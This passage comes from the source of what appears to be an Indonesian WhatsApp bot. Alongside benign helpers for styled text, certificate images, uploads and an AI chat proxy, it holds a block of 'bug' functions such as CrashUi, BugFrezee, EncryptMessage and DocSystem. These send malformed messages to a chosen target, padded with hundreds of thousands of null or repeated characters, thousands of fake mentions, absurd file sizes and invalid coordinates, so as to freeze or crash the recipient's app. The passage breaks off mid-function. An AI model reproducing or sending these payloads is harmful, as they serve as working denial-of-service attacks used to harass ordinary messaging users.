    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  abc.map((v, i) =>
    replacer.push({
      original: v,
      convert: Dinz[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const isUrl = (url) => {
    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
function msToDate(mse) {
    let temp = mse;
    let days = Math.floor(mse / (24 * 60 * 60 * 1000));
    let daysms = mse % (24 * 60 * 60 * 1000);
    let hours = Math.floor(daysms / (60 * 60 * 1000));
    let hoursms = mse % (60 * 60 * 1000);
    let minutes = Math.floor(hoursms / (60 * 1000));
    let minutesms = mse % (60 * 1000);
    let sec = Math.floor(minutesms / 1000);

    return `${days} Days ${hours} Hours ${minutes} Minutes`;
}

async function getGcName(groupID) {
            try {
                let data_name = await TradzSigma.groupMetadata(groupID)
                return data_name.subject
            } catch (err) {
                return '-'
            }
        }
//bug functions
async function listbut2(chat, teks, listnye, jm) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363401647250932@newsletter",
newsletterName: `${namaSaluran}`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© ${ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: jm})
await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
async function uploadwidipe(poto) {
const axios = require("axios");
const FormData = require("form-data");
const path = require('path');
    try {
      const mime = require('mime-types');
  const form = new FormData();
  const contentType = mime.lookup(poto);
  const fileName = path.basename(poto);
  form.append('file', fs.createReadStream(poto), {
    contentType: contentType || 'application/octet-stream',
    filename: fileName,
  });
      const response = await axios.post('https://cdn.elxyzgpt.xyz/', form, {
        headers: form.getHeaders(),
        onUploadProgress: (progressEvent) => {
          if (progressEvent.lengthComputable) {
            console.log(`🚀 Upload Progress: ${(progressEvent.loaded * 100) / progressEvent.total}%`);
          }
        }
      });
    const hasilnya = response.data.fileUrl
      console.log('🎉 File Upload Success:', response.data);
      return hasilnya;
    } catch (error) {
      console.error('🚫 Upload Failed:', error);
      reject(error);
    }
}
async function generateAndSendCertificate(recipientName, achievementText) {
  const { createCanvas, loadImage } = require('canvas');
  const width = 1000;
  const height = 700;
  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext('2d');
  const backgroundUrl = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMXesWUGxIerARGsveu1mOdGdXM0icRcBLtSA-L5UNSdUaRjEYRez9ngnc&s=10';
  try {
    const background = await loadImage(backgroundUrl);
    ctx.drawImage(background, 0, 0, width, height);
  } catch (error) {
    console.error("Error loading background image:", error);
    ctx.fillStyle = '#f8f8f8';
    ctx.fillRect(0, 0, width, height);
  }
  const gradient = ctx.createLinearGradient(0, 0, 0, height);
  gradient.addColorStop(0, 'rgba(255,255,255,0.3)');
  gradient.addColorStop(1, 'rgba(255,255,255,0.7)');
  ctx.fillStyle = gradient;
  ctx.fillRect(0, 0, width, height);
  function drawRoundedRect(ctx, x, y, width, height, radius) {
    ctx.beginPath();
    ctx.moveTo(x + radius, y);
    ctx.lineTo(x + width - radius, y);
    ctx.quadraticCurveTo(x + width, y, x + width, y + radius);
    ctx.lineTo(x + width, y + height - radius);
    ctx.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);
    ctx.lineTo(x + radius, y + height);
    ctx.quadraticCurveTo(x, y + height, x, y + height - radius);
    ctx.lineTo(x, y + radius);
    ctx.quadraticCurveTo(x, y, x + radius, y);
    ctx.closePath();
  }
  ctx.lineWidth = 8;
  const borderGradient = ctx.createLinearGradient(0, 0, width, height);
  borderGradient.addColorStop(0, '#ff7f50');
  borderGradient.addColorStop(1, '#ff1493');
  ctx.strokeStyle = borderGradient;
  drawRoundedRect(ctx, 10, 10, width - 20, height - 20, 30);
  ctx.stroke();
  ctx.shadowColor = 'rgba(0,0,0,0.3)';
  ctx.shadowBlur = 10;
  ctx.shadowOffsetX = 2;
  ctx.shadowOffsetY = 2;
  ctx.fillStyle = '#333';
  ctx.font = 'bold 50px Georgia';
  ctx.textAlign = 'center';
  ctx.fillText('SERTIFIKAT SIFAT', width / 2, 120);
  ctx.shadowColor = 'transparent';
  ctx.font = 'italic 30px Georgia';
  ctx.fillStyle = '#555';
  ctx.fillText('Presented To', width / 2, 180);
  ctx.font = 'bold 40px Georgia';
  ctx.fillStyle = '#000';
  ctx.fillText(recipientName, width / 2, 260);
  ctx.font = '30px Georgia';
  ctx.fillStyle = '#333';
  ctx.fillText(achievementText, width / 2, 330);
  ctx.strokeStyle = '#ff1493';
  ctx.lineWidth = 3;
  ctx.beginPath();
  ctx.moveTo(width / 4, 360);
  ctx.lineTo(width * 3 / 4, 360);
  ctx.stroke();
  const today = new Date();
  ctx.font = '20px Georgia';
  ctx.textAlign = 'right';
  ctx.fillStyle = '#000';
  ctx.fillText(`Tanggal: ${today.toLocaleDateString()}`, width - 40, height - 40);
  ctx.font = '24px Georgia';
  ctx.textAlign = 'left';
  ctx.fillText('DinzID', 50, height - 50);
  const buffer = canvas.toBuffer('image/png');
  TradzSigma.sendMessage(
    m.chat,
    {
      image: buffer,
      caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${recipientName}`
    },
    { quoted: m }
  );
}
async function DinzIDai(pushname, text) {
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,
            "tokenLimit": 8000,
            "completionTokenLimit": 5000,
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": "nama mu adalah yoimiya, gunakan bahasa lucu dan kekinian agar tidak seperti ai banget, ekspresikan kamu menggunakan emoji, dan kamu adalah asisten kecerdasan buatan yang sering membantu orang lain jika ada yang ditanyakan, dan kamu adalah bot WhatsApp yang di buat oleh DinzID", 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    reply(result)
}
let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${command}* ${teks}\n`
}
TradzSigma.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}
async function loadingx() {
      var loadingz = [
        "> *🕘 L O*",
        "> *🕣 L O A*",
        "> *🕠 L O A D*",
        "> *🕔 L O A D I*",
        "> *🕟 L O A D I N*",
        "> *🕔 L O A D I N G*",
        "> *🕔 L O A D I N G*",
        "> *🕐 L O A D I N G*",
        "> *🕧 L O A D I N G*",
        "*SUKSES SEND BUG ✅*",
      ];
      let { key } = await TradzSigma.sendMessage(m.chat, {
        text: "*OKE OTW SEND BUG 💀*",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(400);
        await VxoZap.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }
function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
const Null = {
key: {
remoteJid: 'cihuy',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"cihuy\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}
    async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ CrazyCrash ⿻",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ VolgiodCrash ⿻ ▾⭑̤" + "ꦾ".repeat(70000),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"\n⿻ VolgiodCrash ⿻\n\n' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻ VolgiodCrash ⿻","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"⿻ CrazyCrash ⿻","sections":[{"title":"TradzSigma IS HERE ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY TradzSigma","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await TradzSigma.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ DinzID Chx ⿻ ▾⭑"));
    }
    async function InVisiXz(X, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "𝐕𝐨𝐥𝐠𝐢𝐨𝐝𝐁𝐚𝐜𝐤🎭",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ VolgiodCrash ⿻ ▾⭑̤",
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ★","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟","sections":[{"title":"𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY XXEN DEV","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: VisiX,
        }
      );

      await TradzSigma.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ MoonCrash ⿻ ▾⭑"));
    }
async function InVisiLoc(X, ThM, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "⭑̤▾ ⿻ 𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                  locationMessage: {
                    degreesLatitude: -999.03499999999999,
                    degreesLongitude: 922.999999999999,
                    name: "⚝𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ⚝",
                    address: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "",
                },
                nativeFlowMessage: {
                  messageParamsJson: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 玄",
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: {
                        title: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟",
                        sections: [
                          {
                            title: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ϟ",
                            rows: [],
                          },
                        ],
                      },
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: {},
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: EsQl,
        }
      );
      await VxoZap.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ XxenTzy ⿻ ▾⭑"));
    }
async function OLDLOC(target, QBug) {
var atc = await generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 \n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb
          },
          hasMediaAttachment: true
        },
        body: {
          text: "ꦾ".repeat(20) + "@1".repeat(50000)
        },
        nativeFlowMessage: {
          messageParamsJson: " ꦾ".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: target, quoted: QBug })
await TradzSigma.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id })
};
async function BugFrezee(target) {
            TradzSigma.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 🥶" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0":"🎭𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ⃟⃟⃟⃟⃟꙰꙰꙰꙰꙰꙰꙰꙱҈҈҈҈҈҈҉҉᠁",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Barainfinity@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );            
        };
async function EncryptMessage(target) {
    const locationMessageContent = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            name: "ꦾ".repeat(50000),
            url: "@1".repeat(30),
            mentionedJid: [
								"1@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
            jpegThumbnail: global.thumb
        }
      }
    }
    });

    const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, { userJid: target });

    await TradzSigma.relayMessage(target, encryptedMessage.message, { participant: { jid: target } });
};
async function DocSystem(target) {
let virtex = "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟";

            TradzSigma.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "TradzSigma || Volgiod" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function DocSystem2(target) {
            TradzSigma.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "TradzSigma" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "KILLERBYMOON",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "putzzdragons@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );
        };
async function DocSystem3(target) {
            TradzSigma.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: "MOON TECH",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                title: "Tra͢sᯭh͢ Ui-Aviliable",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "TypeTrashUi-Killer"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'call_permission_request',
                                        buttonParamsJson: '{}'
                                    }
                                ]
                            },
                            contextInfo: {
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Sent",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "MOON KILLER",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "TradzSigma@gmail.com",
                "screen_1_TextInput_3": "94643116",
